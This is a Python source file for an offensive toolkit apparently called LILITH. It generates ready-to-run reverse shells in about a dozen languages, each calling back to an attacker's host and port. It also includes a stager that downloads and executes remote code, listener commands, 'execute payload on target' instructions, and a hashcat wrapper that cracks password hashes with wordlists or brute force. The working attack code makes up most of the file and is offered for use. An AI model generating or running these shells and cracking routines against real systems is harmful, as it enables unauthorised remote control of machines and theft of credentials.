#!/usr/bin/env python3
"""
LILITH Metasploit-like Framework
================================
Provides exploit and payload generation capabilities similar to Metasploit.
Since actual Metasploit can't be installed, this provides common payloads and techniques.
"""

import base64
import random
import string
from typing import Dict, List, Optional


class MetasploitLite:
    """Lightweight Metasploit-like functionality"""
    
    def __init__(self):
        self.available = True  # Always available (simulated)
    
    def get_exploits(self, search: str = None) -> Dict:
        """Get list of available exploits"""
        exploits = [
            {
                "name": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
                "description": "Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)",
                "rank": "excellent",
                "platform": "unix"
            },
            {
                "name": "exploit/windows/smb/ms17_010_eternalblue",
                "description": "MS17-010 EternalBlue SMB Remote Code Execution",
                "rank": "excellent",
                "platform": "windows"
            },
            {
                "name": "exploit/multi/http/struts2_content_type_ognl",
                "description": "Apache Struts 2 Content-Type OGNL Injection",
                "rank": "excellent",
                "platform": "multi"
            },
            {
                "name": "exploit/unix/webapp/drupal_drupalgeddon2",
                "description": "Drupal Drupalgeddon 2 Remote Code Execution",
                "rank": "excellent",
                "platform": "unix"
            },
            {
                "name": "exploit/multi/http/log4shell_header_injection",
                "description": "Log4j Remote Code Execution (Log4Shell)",
                "rank": "excellent",
                "platform": "multi"
            },
            {
                "name": "exploit/windows/smb/psexec",
                "description": "Microsoft Windows PsExec Authenticated Code Execution",
                "rank": "manual",
                "platform": "windows"
            },
            {
                "name": "exploit/linux/ssh/sshexec",
                "description": "SSH User Code Execution",
                "rank": "manual",
                "platform": "linux"
            },
            {
                "name": "exploit/multi/http/jenkins_script_console",
                "description": "Jenkins Script Console Code Execution",
                "rank": "excellent",
                "platform": "multi"
            }
        ]
        
        if search:
            search_lower = search.lower()
            exploits = [e for e in exploits if search_lower in e["name"].lower() or search_lower in e["description"].lower()]
        
        return {
            "success": True,
            "exploits": exploits,
            "count": len(exploits)
        }
    
    def get_payloads(self, search: str = None) -> Dict:
        """Get list of available payloads"""
        payloads = [
            {"name": "cmd/unix/reverse_bash", "description": "Unix Bash Reverse Shell", "platform": "unix"},
            {"name": "cmd/unix/reverse_python", "description": "Unix Python Reverse Shell", "platform": "unix"},
            {"name": "cmd/unix/reverse_perl", "description": "Unix Perl Reverse Shell", "platform": "unix"},
            {"name": "cmd/unix/reverse_netcat", "description": "Unix Netcat Reverse Shell", "platform": "unix"},
            {"name": "cmd/unix/reverse_php", "description": "PHP Reverse Shell", "platform": "multi"},
            {"name": "windows/meterpreter/reverse_tcp", "description": "Windows Meterpreter Reverse TCP", "platform": "windows"},
            {"name": "linux/x64/meterpreter/reverse_tcp", "description": "Linux Meterpreter Reverse TCP", "platform": "linux"},
            {"name": "python/meterpreter/reverse_tcp", "description": "Python Meterpreter Reverse TCP", "platform": "multi"},
            {"name": "cmd/windows/powershell_reverse_tcp", "description": "PowerShell Reverse Shell", "platform": "windows"},
        ]
        
        if search:
            search_lower = search.lower()
            payloads = [p for p in payloads if search_lower in p["name"].lower() or search_lower in p["description"].lower()]
        
        return {
            "success": True,
            "payloads": payloads,
            "count": len(payloads)
        }
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, format: str = "raw") -> Dict:
        """Generate a payload"""
        
        payloads = {
            "cmd/unix/reverse_bash": f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            
            "cmd/unix/reverse_python": f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'''',
            
            "cmd/unix/reverse_perl": f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
            
            "cmd/unix/reverse_netcat": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            
            "cmd/unix/reverse_php": f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            
            "cmd/windows/powershell_reverse_tcp": f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
            
            "python/meterpreter/reverse_tcp": f'''python3 -c '
import socket,struct,time
for x in range(10):
 try:
  s=socket.socket(2,socket.SOCK_STREAM)
  s.connect(("{lhost}",{lport}))
  break
 except:
  time.sleep(5)
l=struct.unpack(">I",s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
 d+=s.recv(l-len(d))
exec(d)
' ''',
        }
        
        if payload_type not in payloads:
            # Generate a generic reverse shell
            payload_code = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
        else:
            payload_code = payloads[payload_type]
        
        # Encode if requested
        encoded = None
        if format == "base64":
            encoded = base64.b64encode(payload_code.encode()).decode()
        
        # Generate listener command
        listener_cmd = f"nc -lvnp {lport}"
        
        return {
            "success": True,
            "payload_type": payload_type,
            "lhost": lhost,
            "lport": lport,
            "payload": payload_code,
            "encoded_base64": encoded,
            "listener_command": listener_cmd,
            "instructions": [
                f"1. Start listener: {listener_cmd}",
                f"2. Execute payload on target",
                f"3. Catch the shell on your listener"
            ]
        }
    
    def generate_all_shells(self, lhost: str, lport: int) -> Dict:
        """Generate all common reverse shells"""
        shells = {
            "bash": f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            "sh": f'/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
            "python2": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
            "perl": f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\' ',
            "php": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            "ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            "netcat": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            "netcat_e": f'nc -e /bin/sh {lhost} {lport}',
            "powershell": f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
            "awk": f'awk \'BEGIN{{s="/inet/tcp/0/{lhost}/{lport}";while(1){{do{{print "|/bin/sh"|& s; s|& getline c; if(c){{while((c|& getline)>0)print $0|& s;close(c)}}}} while(c != "exit");close(s)}}}}\'',
            "java": f'Runtime r = Runtime.getRuntime();Process p = r.exec("/bin/bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'");p.waitFor();',
            "socat": f'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}',
            "nodejs": f'require(\'child_process\').exec(\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\')'
        }
        
        return {
            "success": True,
            "lhost": lhost,
            "lport": lport,
            "listener": f"nc -lvnp {lport}",
            "shells": shells
        }


class HashcatIntegration:
    """Hashcat integration for password cracking"""
    
    def __init__(self):
        import subprocess
        result = subprocess.run(['which', 'hashcat'], capture_output=True)
        self.available = result.returncode == 0
        self.hashcat_path = result.stdout.decode().strip() if self.available else None
    
    def identify_hash(self, hash_value: str) -> Dict:
        """Identify hash type"""
        hash_types = []
        hash_len = len(hash_value)
        
        # Common hash patterns
        patterns = [
            (32, ['0', '1000'], 'MD5 / NTLM'),
            (40, ['100', '300'], 'SHA1'),
            (64, ['1400', '1700'], 'SHA256 / SHA512'),
            (128, ['1700', '1800'], 'SHA512 / SHA512crypt'),
            (34, ['3200'], 'bcrypt'),
            (60, ['3200'], 'bcrypt'),
            (13, ['500'], 'MD5crypt'),
        ]
        
        for length, modes, name in patterns:
            if hash_len == length or (length == 60 and hash_value.startswith('$2')):
                hash_types.append({
                    'name': name,
                    'hashcat_modes': modes,
                    'example_cmd': f'hashcat -m {modes[0]} hash.txt wordlist.txt'
                })
        
        # Check for specific prefixes
        if hash_value.startswith('$1$'):
            hash_types = [{'name': 'MD5crypt', 'hashcat_modes': ['500'], 'example_cmd': 'hashcat -m 500 hash.txt wordlist.txt'}]
        elif hash_value.startswith('$5$'):
            hash_types = [{'name': 'SHA256crypt', 'hashcat_modes': ['7400'], 'example_cmd': 'hashcat -m 7400 hash.txt wordlist.txt'}]
        elif hash_value.startswith('$6$'):
            hash_types = [{'name': 'SHA512crypt', 'hashcat_modes': ['1800'], 'example_cmd': 'hashcat -m 1800 hash.txt wordlist.txt'}]
        elif hash_value.startswith('$2a$') or hash_value.startswith('$2b$') or hash_value.startswith('$2y$'):
            hash_types = [{'name': 'bcrypt', 'hashcat_modes': ['3200'], 'example_cmd': 'hashcat -m 3200 hash.txt wordlist.txt'}]
        elif hash_value.startswith('$apr1$'):
            hash_types = [{'name': 'Apache MD5', 'hashcat_modes': ['1600'], 'example_cmd': 'hashcat -m 1600 hash.txt wordlist.txt'}]
        
        return {
            'success': True,
            'hash': hash_value[:20] + '...' if len(hash_value) > 20 else hash_value,
            'length': hash_len,
            'possible_types': hash_types if hash_types else [{'name': 'Unknown', 'hashcat_modes': [], 'example_cmd': 'Run hashcat --help for all modes'}]
        }
    
    def crack_hash(self, hash_value: str, mode: int = 0, wordlist: str = None, attack_mode: int = 0, rules: str = None) -> Dict:
        """Crack hash using hashcat"""
        if not self.available:
            return {'success': False, 'error': 'Hashcat not installed'}
        
        import subprocess
        import tempfile
        import os
        
        # Use default wordlist if not specified
        if not wordlist:
            # Check for common wordlists
            common_wordlists = [
                '/usr/share/wordlists/rockyou.txt',
                '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
                '/usr/share/john/password.lst'
            ]
            for wl in common_wordlists:
                if os.path.exists(wl):
                    wordlist = wl
                    break
        
        # Create temp file for hash
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(hash_value)
            hash_file = f.name
        
        try:
            # Build hashcat command
            cmd = [
                self.hashcat_path,
                '-m', str(mode),
                '-a', str(attack_mode),
                '--force',  # Force CPU mode
                '-O',  # Optimized kernels
                '--potfile-disable',
                hash_file
            ]
            
            if wordlist and os.path.exists(wordlist):
                cmd.append(wordlist)
            else:
                # Use brute force with charset if no wordlist
                cmd.extend(['?a?a?a?a?a?a'])  # 6 char all charset
            
            if rules and os.path.exists(rules):
                cmd.extend(['-r', rules])
            
            # Run with timeout
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120  # 2 minute timeout
            )
            
            # Check for cracked password in output
            cracked = None
            for line in result.stdout.split('\n'):
                if hash_value in line and ':' in line:
                    cracked = line.split(':')[-1]
                    break
            
            return {
                'success': True,
                'hash': hash_value[:20] + '...',
                'mode': mode,
                'wordlist': wordlist,
                'cracked': cracked,
                'status': 'Cracked!' if cracked else 'Not cracked (try different wordlist or mode)',
                'output': result.stdout[-1000:] if result.stdout else None,
                'errors': result.stderr[-500:] if result.stderr else None
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Cracking timed out after 2 minutes',
                'hint': 'Try a smaller wordlist or different attack mode'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            os.unlink(hash_file)
    
    def benchmark(self) -> Dict:
        """Run hashcat benchmark"""
        if not self.available:
            return {'success': False, 'error': 'Hashcat not installed'}
        
        import subprocess
        
        try:
            result = subprocess.run(
                [self.hashcat_path, '-b', '--force', '-O', '-w', '1', '-m', '0'],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': True,
                'benchmark': result.stdout,
                'device_info': 'CPU mode (no GPU detected)'
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Benchmark timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}


# Singleton instances
_metasploit = None
_hashcat = None


def get_metasploit() -> MetasploitLite:
    global _metasploit
    if _metasploit is None:
        _metasploit = MetasploitLite()
    return _metasploit


def get_hashcat() -> HashcatIntegration:
    global _hashcat
    if _hashcat is None:
        _hashcat = HashcatIntegration()
    return _hashcat


if __name__ == "__main__":
    # Test
    msf = get_metasploit()
    print("Exploits:", msf.get_exploits()['count'])
    print("\nShells:")
    shells = msf.generate_all_shells("10.0.0.1", 4444)
    for name, shell in list(shells['shells'].items())[:3]:
        print(f"  {name}: {shell[:50]}...")
    
    hc = get_hashcat()
    print(f"\nHashcat available: {hc.available}")
    print("Hash identify:", hc.identify_hash("5d41402abc4b2a76b9719d911017c592"))
